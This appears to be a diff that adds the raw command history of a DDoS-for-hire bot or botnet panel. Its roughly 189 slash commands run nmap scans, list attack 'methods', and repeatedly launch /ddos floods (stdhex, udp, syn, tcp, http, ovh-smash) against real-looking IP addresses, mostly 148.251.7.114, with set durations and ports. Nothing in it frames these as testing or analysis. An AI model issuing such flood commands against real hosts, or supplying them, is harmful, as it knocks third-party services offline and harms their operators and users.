@@ -1,0 +1,189 @@
+/info
+/plan
+/ping 148.251.7.114
+/nmapsv 148.251.7.114
+/nmapresult
+/nmapresult
+/nmapresult
+/nmap 148.251.7.114 80
+/methods
+/ddos http 148.251.7.114 60
+/ping 148.251.7.114
+/ddos udp 148.251.7.114 60
+/ping /ddos http 148.251.7.114 60
+/ping 148.251.7.114
+/ddos udp 148.251.7.114 60
+/ddos stdhex 148.251.7.114 120
+/ddos stdhex 138.68.5.42 120
+/ddos stdhex 148.251.7.114 120
+/ddos stdhex 148.251.7.114 120
+/ddos stdhex 148.251.7.114 120
+/ddos stdhex 148.251.7.114 120
+/ping 148.251.7.114
+/ddos udp 148.251.7.114 120
+/ddos stdhex 148.251.7.114 120
+/ddos stdhex 148.251.7.114 120
+/ping 148.251.7.114
+/ddos stdhex 148.251.7.114 120
+/ddos stdhex 148.251.7.114 120
+/ping 148.251.7.114
+/ddos stdhex 148.251.7.114 1200
+/ddos stdhex 148.251.7.114 1200
+/ddos stdhex 148.251.7.114 120
+/ddos stdhex 148.251.7.114 120
+/ddos udp 148.251.7.114 120
+/ping 148.251.7.114
+/ddos stdhex 148.251.7.114 120
+/ddos stdhex 148.251.7.114 120
+/ping 148.251.7.114
+/ddos stdhex 148.251.7.114 1200
+/ping 148.251.7.114
+/ping 148.251.7.114
+/ping 148.251.7.114
+/ping 148.251.7.114
+/ping 148.251.7.114
+/ping 148.251.7.114
+/ddos stdhex 148.251.7.114 1200
+/ddos stdhex 148.251.7.114 1200
+/ping 148.251.7.114
+/ddos stdhex 148.251.7.114 1200
+/ddos stdhex 148.251.7.114 1200
+/ddos stdhex 148.251.7.114 1200
+/ddos stdhex 148.251.7.114 1200
+/ddos stdhex 148.251.7.114 1200
+/ddos stdhex 148.251.7.114 1200
+/ping 148.251.7.114
+/ddos stdhex 148.251.7.114 1200
+/stoplag 148.251.7.114
+/lagstop 148.251.7.114
+/lag stdhex 73.0.193.30 125 120 10
+/ddos stdhex 148.251.7.114 600
+/ddos stdhex 148.251.7.114 600
+/ddos stdhex 148.251.7.114 120
+/ddos stdhex 148.251.7.114 600
+/ping 148.251.7.114
+/ddos stdhex 148.251.7.114 1200
+/ddos stdhex 148.251.7.114 1200
+/ddos stdhex 148.251.7.114 1200
+/ddos stdhex 148.251.7.114 1200
+/ddos stdhex 148.251.7.114 1200
+/ddos stdhex 148.251.7.114 120
+/ddos udp 148.251.7.114 120
+/ddos stdhex 148.251.7.114 120
+/ddos stdhex 148.251.7.114 120
+/ddos stdhex 148.251.7.114 120
+/ddos stdhex 148.251.7.114 120
+/ping 148.251.7.114
+/ddos stdhex 148.251.7.114 120
+/ddos stdhex 148.251.7.114 120
+/ddos stdhex 148.251.7.114 120
+/ddos stdhex 148.251.7.114 1200
+/ddos stdhex 148.251.7.114 1200
+/ddos stdhex 148.251.7.114 1200
+/ddos stdhex 148.251.7.114 60
+/ddos stdhex 148.251.7.114 600
+/ddos stdhex 148.251.7.114 600
+/ddos stdhex 148.251.7.114 120
+/ddos stdhex 148.251.7.114 1200
+/ddos stdhex 148.251.7.114 1200
+/ddos stdhex 148.251.7.114 1200
+/ddos stdhex 148.251.7.114 1200
+/ddos stdhex 148.251.7.114 1200
+/ddos stdhex 148.251.7.114 1200
+/ping 148.251.7.114
+/methos
+/methods
+/ddos http 148.251.7.114 1200
+/ddos stdhex 148.251.7.114 1200
+/ddos stdhex 148.251.7.114 1200
+/ddos stdhex 148.251.7.114 1200
+/ddos stdhex 148.251.7.114 1200
+/ping 148.251.7.114
+/ddos stdhex 148.251.7.114 1200
+/ping 148.251.7.114
+/ddos stdhex 148.251.7.114 1200
+/ddos stdhex 148.251.7.114 120
+/ddos stdhex 148.251.7.114 120
+/ddos stdhex 148.251.7.114 120
+/ddos stdhex 148.251.7.114 120
+/ddos stdhex 148.251.7.114 120
+/ddos stdhex 148.251.7.114 120
+/ddos stdhex 148.251.7.114 120
+/ddos stdhex 148.251.7.114 120
+/ddos stdhex 148.251.7.114 120
+/ddos stdhex 148.251.7.114 120
+/ddos stdhex 148.251.7.114 120
+/ddos stdhex 148.251.7.114 120
+/ddos stdhex 148.251.7.114 120
+/ddos stdhex 148.251.7.114 120
+/ddos stdhex 148.251.7.114 120
+/ddos stdhex 148.251.7.114 120
+/ddos ovh-smash 109.41.130.22 100 53
+/ddos stdhex 148.251.7.114 120
+/ddos stdhex 148.251.7.114 120
+/ddos stdhex 148.251.7.114 120
+/ddos stdhex 148.251.7.114 120
+/ddos stdhex 148.251.7.114 120
+/ddos stdhex 148.251.7.114 120
+/ddos stdhex 148.251.7.114 120
+/check 148.251.7.114
+/ddos stdhex 148.251.7.114 120
+/ddos stdhex 148.251.7.114 120
+/nmapsv 148.251.7.114
+/nmapresult
+/ddos stdhex 148.251.7.114 25 120
+/ddos stdhex 148.251.7.114 120 25
+/ddos stdhex 148.251.7.114 120 53
+/ddos stdhex 148.251.7.114 120 110
+/ddos stdhex 148.251.7.114 120 143
+/ddos udp 148.251.7.114 120 25
+/ddos udp 148.251.7.114 120 53
+/ddos udp 148.251.7.114 120 110
+/ddos udp 148.251.7.114 120 143
+/ping 148.251.7.114
+/ddos udp 148.251.7.114 120 25
+/ddos udp 148.251.7.114 120 53
+/methods
+/ddos tcp 148.251.7.114 120 25
+/ddos tcp 148.251.7.114 120 53
+/ddos udp 148.251.7.114 120 25
+/ddos udp 148.251.7.114 120 53
+/ddos udp 148.251.7.114 120 110
+/ddos syn 148.251.7.114 1200 53
+/ddos udp 148.251.7.114 120 53
+/ddos udp 148.251.7.114 120 53
+/ddos syn 148.251.7.114 120 53
+/ddos stfhex 148.251.7.114 120 53
+/ddos stdhex 148.251.7.114 120 53
+/ping 148.251.7.114
+/ddos stdhex 148.251.7.114 120 53
+/ddos stdhex 148.251.7.114 120 53
+/ddos stdhex 148.251.7.114 120 53
+/ddos stdhex 148.251.7.114 120 53
+/ddos stdhex 148.251.7.114 120 53
+/ddos stdhex 148.251.7.114 240 53
+/ddos stdhex 148.251.7.114 120 53
+/ddos stdhex 148.251.7.114 120 53
+/ddos stdhex 148.251.7.114 120 53
+/ddos stdhex 148.251.7.114 120 53
+/ddos stdhex 148.251.7.114 120 53
+/ddos stdhex 148.251.7.114 120 53
+/ddos stdhex 148.251.7.114 120 53
+/ddos stdhex 148.251.7.114 120 53
+/ddos stdhex 148.251.7.114 120 53
+/ddos stdhex 148.251.7.114 120 53
+/ddos stdhex 148.251.7.114 120 53
+/ddos stdhex 148.251.7.114 120 53
+/ddos stdhex 148.251.7.114 120 53
+/ddos stdhex 148.251.7.114 120 53
+/checkip 73.160.84.33
+/check 73.160.84.33
+/ping 73.160.84.33
+/ddos stdhex 148.251.7.114 120 53
+/ddos stdhex 148.251.7.114 120 53
+/nmapsv 148.251.7.120
+/ddos stdhex 148.251.7.114 120 53
+/ddos stdhex 148.251.7.114 120 53
+/ddos stdhex 148.251.7.114 120 53
+/ddos stdhex 148.251.7.114 120 53
+/methods
